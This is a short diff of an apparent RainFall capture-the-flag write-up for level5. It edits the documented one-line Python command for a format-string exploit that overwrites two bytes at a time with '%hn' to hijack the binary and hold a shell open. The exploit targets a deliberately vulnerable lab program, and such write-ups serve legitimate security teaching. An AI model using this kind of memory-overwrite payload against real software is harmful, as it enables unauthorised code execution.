@@ -16,7 +16,7 @@ The structure of our exploit is as follow:
 - bytes 2052-33956: Filler bytes used to write the last 2 bytes, 0x84a4
 
 The command looks like this:
-`(python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%02044x' + '%5\$hn' + '%031904x' + '%4\$hn'"; cat) | ./level5`
+`python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%02044x' + '%5\$hn' + '%031904x' + '%4\$hn'"`
 
 level5@RainFall:~$ (python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%02044x' + '%5\$hn' + '%031904x' + '%4\$hn'"; cat) | ./level5
 ...
